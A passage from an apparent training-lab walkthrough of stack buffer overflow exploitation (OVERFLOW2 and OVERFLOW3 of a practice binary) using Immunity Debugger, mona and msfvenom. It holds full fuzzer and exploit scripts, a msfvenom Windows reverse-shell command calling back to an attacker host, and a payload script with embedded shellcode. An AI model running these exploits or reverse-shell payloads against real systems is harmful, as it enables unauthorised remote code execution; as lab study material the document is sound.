\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00\x23\x3c\x83\xba
```

	Task 3
		b. In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW2?
			\x00\x23\x3c\x83\xba


30. In target machine. Immunity Debugger. Tell mona to update the bytearray.

`!mona bytearray -b "\x00\x23\x3c\x83\xba"`

![800](img/Pasted%20image%2020240828174508.png)


31. In target machine. Immunity Debugger > Debug > Restart > Play.


32. Edit the exploit.py with the bad chars. Then execute the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW2 "  # The command or identifier expected by the target service
offset = 634             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


31. Immunity Debugger. Compare using mona.

** Do not restart Immunity Debbuger.

`!mona compare -f C:\mona\oscp\bytearray.bin -a esp

![800](img/Pasted%20image%2020240828173050.png)


32. Immunity Debugger > Debug > Restart

![800](img/Pasted%20image%2020240828173231.png)


33. Use the command mona jmp, the esp and the excluded bad chars.

`!mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"`\

Select and double click
![800](img/Pasted%20image%2020240828174845.png)

Showing ESP 625011AF

![800](img/Pasted%20image%2020240828174820.png)


34. Create shellcode using msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f python -v "shellcode"


35. Create python script for payload.py

```python

#!/usr/bin/env python3

import socket


ip='target.local'
port=1337

shellcode =  ""
shellcode += "\xdb\xc6\xbd\xeb\x1b\x39\xf7\xd9\x74\x24\xf4"
shellcode += "\x5e\x2b\xc9\xb1\x52\x31\x6e\x17\x83\xc6\x04"
shellcode += "\x03\x85\x08\xdb\x02\xa5\xc7\x99\xed\x55\x18"
shellcode += "\xfe\x64\xb0\x29\x3e\x12\xb1\x1a\x8e\x50\x97"
shellcode += "\x96\x65\x34\x03\x2c\x0b\x91\x24\x85\xa6\xc7"
shellcode += "\x0b\x16\x9a\x34\x0a\x94\xe1\x68\xec\xa5\x29"
shellcode += "\x7d\xed\xe2\x54\x8c\xbf\xbb\x13\x23\x2f\xcf"
shellcode += "\x6e\xf8\xc4\x83\x7f\x78\x39\x53\x81\xa9\xec"
shellcode += "\xef\xd8\x69\x0f\x23\x51\x20\x17\x20\x5c\xfa"
shellcode += "\xac\x92\x2a\xfd\x64\xeb\xd3\x52\x49\xc3\x21"
shellcode += "\xaa\x8e\xe4\xd9\xd9\xe6\x16\x67\xda\x3d\x64"
shellcode += "\xb3\x6f\xa5\xce\x30\xd7\x01\xee\x95\x8e\xc2"
shellcode += "\xfc\x52\xc4\x8c\xe0\x65\x09\xa7\x1d\xed\xac"
shellcode += "\x67\x94\xb5\x8a\xa3\xfc\x6e\xb2\xf2\x58\xc0"
shellcode += "\xcb\xe4\x02\xbd\x69\x6f\xae\xaa\x03\x32\xa7"
shellcode += "\x1f\x2e\xcc\x37\x08\x39\xbf\x05\x97\x91\x57"
shellcode += "\x26\x50\x3c\xa0\x49\x4b\xf8\x3e\xb4\x74\xf9"
shellcode += "\x17\x73\x20\xa9\x0f\x52\x49\x22\xcf\x5b\x9c"
shellcode += "\xe5\x9f\xf3\x4f\x46\x4f\xb4\x3f\x2e\x85\x3b"
shellcode += "\x1f\x4e\xa6\x91\x08\xe5\x5d\x72\x3d\xf1\x1c"
shellcode += "\x7d\x29\x07\x9e\xa2\x9b\x8e\x78\xce\xcb\xc6"
shellcode += "\xd3\x67\x75\x43\xaf\x16\x7a\x59\xca\x19\xf0"
shellcode += "\x6e\x2b\xd7\xf1\x1b\x3f\x80\xf1\x51\x1d\x07"
shellcode += "\x0d\x4c\x09\xcb\x9c\x0b\xc9\x82\xbc\x83\x9e"
shellcode += "\xc3\x73\xda\x4a\xfe\x2a\x74\x68\x03\xaa\xbf"
shellcode += "\x28\xd8\x0f\x41\xb1\xad\x34\x65\xa1\x6b\xb4"
shellcode += "\x21\x95\x23\xe3\xff\x43\x82\x5d\x4e\x3d\x5c"
shellcode += "\x31\x18\xa9\x19\x79\x9b\xaf\x25\x54\x6d\x4f"
shellcode += "\x97\x01\x28\x70\x18\xc6\xbc\x09\x44\x76\x42"
shellcode += "\xc0\xcc\x96\xa1\xc0\x38\x3f\x7c\x81\x80\x22"
shellcode += "\x7f\x7c\xc6\x5a\xfc\x74\xb7\x98\x1c\xfd\xb2"
shellcode += "\xe5\x9a\xee\xce\x76\x4f\x10\x7c\x76\x5a"



Command = "OVERFLOW2 "
Offset = 1978*"A"
jmp = "\xBB\x11\x50\x62"
# 625011AF

nops = 16*"\x90"

string = Command + Offset + jmp + nops + shellcode


try:
	with socket.socket() as s:
		s.connect((ip,port))
		print("sending  exploit")
		s.send(bytes(string,'latin-1'))
	
except:
	print("failed to connect")
```


# Task 4 oscp.exe - OVERFLOW3


1. In Kali. Using Remmina, remote to target machine.

![800](img/Pasted%20image%2020240821141857.png)


2. In target machine. Right click Immunity Debugger > Run as administrator. File > Open > Desktop\\vulnerable-apps\\oscp\\oscp. Click red play button, will show Running. 

![800](img/Pasted%20image%2020240821141958.png)


4. In Kali. Open a terminal. NC to the target machine with port 1337. Type "HELP" to view the commands. Type "OVERFLOW2 test" to verify.

![800](img/Pasted%20image%2020240829164205.png)


5. In target machine. In the Immunity Debugger. Input the mona command.

`!mona config -set workingfolder c:\mona\%p

![800](img/Pasted%20image%2020240829164238.png)


6. In Kali. Create a script, fuzzer.py.

```python
#!/usr/bin/env python3

import socket, time, sys  # Import necessary modules: socket for networking, time for delays, sys for exiting the script

# Define the target IP address or hostname
ip = "target.local"

# Define the target port number
port = 1337

# Set the timeout duration (in seconds) for the socket connection
timeout = 5

# Define a prefix to prepend to the payload being sent
prefix = "OVERFLOW3 "

# Initialize the payload with the prefix followed by 100 "A" characters
string = prefix + "A" * 100

# Start an infinite loop to continually send increasing payload sizes
while True:
    try:
        # Create a new socket object for IPv4 (AF_INET) and TCP (SOCK_STREAM)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set the timeout for the socket connection
            s.settimeout(timeout)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Receive the initial response from the server (optional step to ensure connection)
            s.recv(1024)
            
            # Print the current size of the payload being sent (excluding the prefix)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            
            # Send the payload to the target server, encoding it as a Latin-1 byte string
            s.send(bytes(string, "latin-1"))
            
            # Receive the server's response (optional step to ensure the payload was sent)
            s.recv(1024)
    
    # If an exception occurs (e.g., the server crashes or connection fails), handle it here
    except:
        # Print the size of the payload that caused the crash and exit the script
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    
    # Increase the size of the payload by 100 "A" characters for the next iteration
    string += 100 * "A"
    
    # Wait 1 second before sending the next payload (to avoid overwhelming the server)
    time.sleep(1)

```


7. In Kali. Create a script, exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW2 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = ""           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


8. In target machine. Immunity Debugger > Debug > Restart > Play.


9. In Kali. Execute the fuzzer.py. The Immunity Debugger will crash and pause.

![800](img/Pasted%20image%2020240829164403.png)


10. Fuzzing crashed at 1300 bytes. Create a pattern by adding 400 bytes, total of 1700 bytes. 

![800](img/Pasted%20image%2020240829164428.png)


11. Immunity Debugger showing EIP 41414141 overwritten with A(hex=41).

![800](img/Pasted%20image%2020240829164608.png)


12. In Kali. Create msf pattern.

`msf-pattern_create -l 1700

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_create -l 1700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce

```


13. In Kali. Edit the script exploit.py and add the output of the msf-pattern.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW3 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


14. In target machine. Immunity Debugger > Debug > Restart > Play.


15. In Kali. Execute the exploit.py.

![800](img/Pasted%20image%2020240821150355.png)


16. Immunity Debugger. EIP 35714234.

![800](img/Pasted%20image%2020240829164942.png)


17. In Kali. Get the offset value of the EIP.

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_offset -l 1700 -q 35714234
[*] Exact match at offset 1274
```

Alternative, get it from Immunity Debugger using mona command.

`!mona findmsp -distance 1700

![800](img/Pasted%20image%2020240829165255.png)

EIP Offset is 1274.

	Task 4
		a. What is the EIP offset for OVERFLOW3?
			1274 


18. In Kali. Edit the exploit.py. Add the offset 1274 and put a retn to be reflected, can use "BBBB"

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW3 "  # The command or identifier expected by the target service
offset = 1274             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


19. In target machine. Immunity Debugger > Debug > Restart > Play.


20. In Kali. Execute exploit.py.

![800](img/Pasted%20image%2020240821152534.png)


21. Immunity Debugger, showing EIP was overwritten with 77EB8DD2 which is the "BBBB". Note the value ESP 0181F518.

![800](img/Pasted%20image%2020240829165901.png)


22. In Immunity Debugger. Create a BADCHARS using mona. By default the syntax \\x00 is a BADCHAR.

`!mona bytearray -b "\x00"

![800](img/Pasted%20image%2020240828170232.png)


23. Creating bad chars. In Kali. By using a python script. Generate a string of bad chars from \\x01 to \\xff.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
